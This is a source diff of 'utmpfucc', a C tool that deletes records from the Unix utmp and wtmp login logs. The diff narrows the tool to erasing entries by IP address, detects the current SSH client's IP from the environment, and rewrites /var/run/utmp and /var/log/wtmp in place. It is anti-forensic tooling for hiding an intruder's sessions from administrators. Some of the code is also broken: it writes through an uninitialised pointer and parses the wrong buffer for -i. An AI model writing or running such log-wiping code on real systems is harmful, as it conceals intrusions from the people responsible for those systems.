@@ -3,37 +3,24 @@
 #define PROG_VERSION "0.1"
 #define PROG_NAME    "utmpfucc"
 
-/* a mostly empty struct with only the fields set that we want to remove,
-   and a pointer to it. the fields are compared in compare_record() */
-utmp t;
-utmp *target = &t;
+// the target ip will go here
+in_addr_t target;
 
-/* the name the program was called as. mostly for use with --help */
+// the name the program was called as. mostly for use with --help
 char *argv0;
 
 void usage()
 {
 	printf(
-"usage: %s [OPTION]...\n"
-"remove entries from utmp/wtmp logs"
-"\n"
-"   -p, --pid=NUMBER    specify pid to remove\n"
-"   -i, --ip=IP         specify ip address to remove\n"
-"   -m, --host=STRING   specify (part of) host name to remove\n"
-"   -D, --dump          print all records without changing anything\n"
-"   -f, --file=FILE     file to modify (default /var/run/utmp, /var/log/wtmp)\n"
-"   -n, --dry-run       don't modify log files\n"
-"   -v, --verbose       control verbosity (can be specified multiple times)\n"
-"   -h, --help          display this help and exit\n"
-"   -V, --version       output version information and exit\n"
-"\n"
-"examples:\n"
-"   %s --ip 4.3.2.1\t# remove records from ip 4.3.2.1\n"
-"   %s -m someisp.com\t# remove records with 'someisp.com' in the host field\n"
-"   %s -f file --dump\t# read all records from file\n"
-"\n",
-	       argv0, argv0, argv0, argv0
-	);
+		"usage: %s [OPTION]...\n"
+		"remove entries from utmp/wtmp logs"
+		"\n"
+		"   -i, --ip=IP         specify ip address to remove\n"
+		"   -n, --dry-run       don't modify log files\n"
+		"   -v, --verbose       control verbosity\n"
+		"   -h, --help          display this help and exit\n"
+		"   -V, --version       output version information and exit\n"
+		"\n", argv0, argv0, argv0, argv0);
 	exit(0);
 }
 
@@ -51,8 +38,10 @@ void version()
 	exit(0);
 }
 
-// debug and general messages
-// always enabled
+/*
+ *   debug and general messages
+ *   always enabled
+ */
 void _(char *fmt, ...)
 {
 	va_list args;
@@ -63,8 +52,10 @@ void _(char *fmt, ...)
     va_end(args);
 }
 
-// verbosity level 1
-// enabled with -v
+/*
+ *   verbosity level 1
+ *   enabled with -v
+ */
 void _1(char *fmt, ...)
 {
 	if (verbose < 1)
@@ -78,8 +69,10 @@ void _1(char *fmt, ...)
     va_end(args);
 }
 
-// etc
-// enabled with -vv
+/*
+ *   etc
+ *   enabled with -vv
+ */
 void _2(char *fmt, ...)
 {
 	if (verbose < 2)
@@ -93,33 +86,24 @@ void _2(char *fmt, ...)
     va_end(args);
 }
 
-
-bool compare_record(utmp *current)
+/*
+ *   compares a utmp record's ip with the one to remove
+ */
+bool compare_record(utmp *r)
 {
+	char *msg;
 	int match = false;
 
-	if (target->ut_pid != 0 && target->ut_pid == current->ut_pid) {
-		_2("%s: '%d'=='%d'", "ut_pid", target->ut_pid, current->ut_pid);
-		match++;
-	}
-	else if (target->ut_addr != 0 && target->ut_addr == current->ut_addr) {
-		_2("%s: '0x%08x'=='0x%08x'", "ut_addr", target->ut_addr, current->ut_addr);
-		match++;
-	}
-	else if ((strlen(target->ut_host) > 0)
-		&& (strstr(current->ut_host, target->ut_host) > 0)) {
-		_2("%s: '%s'=='%s'", "ut_host", target->ut_host, current->ut_host);
-		match++;
-	}
+	if (target != 0 && target == r->ut_addr)
+		match = true;
 
-	char *msg = format_record(current);
+	 msg = format_record(r);
 
-	if (match) {
+	if (match)
 		printf("\033[38;5;196m%s\033[m -- REMOVED!\n", msg);
-	}
-	else if (verbose) {
+	else if (verbose)
 		printf("%s\n", msg);
-	}
+
 	free(msg);	
 
 	return match;
@@ -137,6 +121,9 @@ void time_to_string(char *timebuf, size_t buflen, time_t sec)
 		_("error in strftime");
 }
 
+/*
+ *   this function exists to isolate the verbose ass error checking
+ */
 void ip_to_string(char *ipbuf, void *ip)
 {
 	struct in_addr *i = (struct in_addr *)ip;
@@ -145,6 +132,23 @@ void ip_to_string(char *ipbuf, void *ip)
 		_("inet_ntop: could not unpack 0x%08x", i->s_addr);
 }
 
+/*
+ *  as above. let's avoid dicking around with casts and error checking anywhere
+ *  else in the file
+ */
+in_addr_t string_to_ip(void *str)
+{
+	struct in_addr *addr;
+
+	if (! inet_pton(AF_INET, (char *)str, addr)) {
+		char *err;
+		asprintf(&err, 
+			"inet_pton: could not make string '%s' into an in_addr_t", str);
+		die(err);
+	}
+
+	return addr->s_addr;
+}
 
 /*
  *   format a utmp record in the style of who(1), with an added pid column
@@ -186,21 +190,6 @@ void print_record(utmp *r)
 	free(line);
 }
 
-
-void dump_all_records(FILE *utmp_file)
-{
-	size_t r_size;
-	char buf[sizeof(utmp)];
-
-	printf("%-8s %-8s %-12s %-16s %s\n", "PID", "NAME", "LINE", "TIME", "COMMENT");
-	while ((r_size = fread(buf, 1, sizeof(utmp), utmp_file)) > 0)
-	{
-		print_record((utmp *)buf);
-	}
-
-	fclose(utmp_file);
-}
-
 /*
  *   try and get the ip address to remove from the environment. first try the
  *   environment variable SSH_CLIENT, then SSH_CONNECTION, else return null.
@@ -235,29 +224,13 @@ char *divine_ip_from_environ(void)
 	return ip;
 }
 
-
-in_addr_t string_to_ip(void *str)
-{
-	struct in_addr *addr;
-
-	if (! inet_pton(AF_INET, (char *)str, addr)) {
-		char *err;
-		asprintf(&err, 
-			"inet_pton: could not make string '%s' into an in_addr_t", str);
-		die(err);
-	}
-
-	return addr->s_addr;
-}
-
-
 void do_getopts(int argc, char **argv)
 {
 	while (1 + 1 == 2)
 	{
 		int c;
 		int *i = 0;
-		char *shortopts = "p:i:hvVDf:m:n";
+		char *shortopts = "i:hvVn";
 
 		// some tmp bufs for -i
 		char in_addr_buf[sizeof(struct in_addr)];
@@ -265,13 +238,9 @@ void do_getopts(int argc, char **argv)
 		int ip;
 
 		struct option longopts[] = {
-			{ "pid",     required_argument, 0, 'p' },
 			{ "ip",      required_argument, 0, 'i' },
 			{ "help",    no_argument,       0, 'h' },
 			{ "version", no_argument,       0, 'V' },
-			{ "dump",    no_argument,       0, 'D' },
-			{ "file",    required_argument, 0, 'f' },
-			{ "host",    required_argument, 0, 'm' },
 			{ "dry-run", required_argument, 0, 'n' },
 			{ NULL,      0,                 0,  0  }
 		};
@@ -296,32 +265,10 @@ void do_getopts(int argc, char **argv)
 				_2("verbose level %d enabled", verbose);
 				break;
 
-			case 'D':
-				only_dump = true;
-				_2("dump only enabled");
-				break;
-
-			case 'f':
-				memset(utmp_filename, '\0', sizeof(utmp_filename));
-				strncpy(utmp_filename, optarg, sizeof(utmp_filename));
-				break;
-
-			case 'p':
-				divine_ip = false;
-				target->ut_pid = (pid_t)atoi(optarg);
-				_2("target pid: %d", target->ut_pid);
-				break;
-
 			case 'i':
 				divine_ip = false;
-				target->ut_addr = string_to_ip(in_addr_buf);
-				_2("target ip: 0x%08x", target->ut_addr);
-				break;
-
-			case 'm':
-				divine_ip = false;
-				strncpy(target->ut_host, optarg, 255);
-				_2("target host: %s", target->ut_host);
+				target = string_to_ip(in_addr_buf);
+				_2("target ip: 0x%08x", target);
 				break;
 
 			case 'n':
@@ -332,9 +279,8 @@ void do_getopts(int argc, char **argv)
 	}
 }
 
-
 /*
- *  read, censor and rewrite a utmp file
+ *   read, censor and rewrite a utmp file
  */
 bool do_utmp_file(char *filename)
 {
@@ -352,19 +298,15 @@ bool do_utmp_file(char *filename)
 	if (tmp == NULL)
 		die("could not open temp file");
 
-	if (only_dump) {
-		dump_all_records(file);
-		return 0;
-	}
-
-	/* read log file, compare records to see if they need to disappear, write
-	   to temp file */
+	// read log file, compare records to see if they need to disappear,
+	// write to temp file
 	while ((r_size = fread(buf, 1, sizeof(utmp), file)) > 0)
 	{
 		lines++;
 
 		if (compare_record((utmp *)buf)) {
 			// the current utmp record needed to be censored
+			// so we do nothing
 		}
 		else {
 			w_size = fwrite(buf, 1, r_size, tmp);
@@ -375,7 +317,7 @@ bool do_utmp_file(char *filename)
 	}
 
 
-	/* write the edited temporary file to the log */
+	// write the edited temporary file to the log
 	if (! dry_run)
 	{
 		lines = 0;
@@ -394,14 +336,9 @@ bool do_utmp_file(char *filename)
 	fclose(tmp);
 }
 
-
-
-
 int main(int argc, char **argv)
 {
 	argv0 = (argv[0] == NULL)? PROG_NAME : basename(argv[0]);
-
-	memset(target, '\0', sizeof(utmp));
 
 	do_getopts(argc, argv);
 
@@ -411,15 +348,15 @@ int main(int argc, char **argv)
 			_("could not get ip from environment. provide one with '-i'");
 			return 1;
 		}
-		target->ut_addr = string_to_ip(ip);
+		target = string_to_ip(ip);
 	}
 
 	if (file_given) {
 		do_utmp_file(utmp_filename);
 	}
 	else {
-		do_utmp_file("utmp");
-		do_utmp_file("wtmp");		
+		do_utmp_file("/var/run/utmp");
+		do_utmp_file("/var/log/wtmp");
 	}
 
 	return 0;
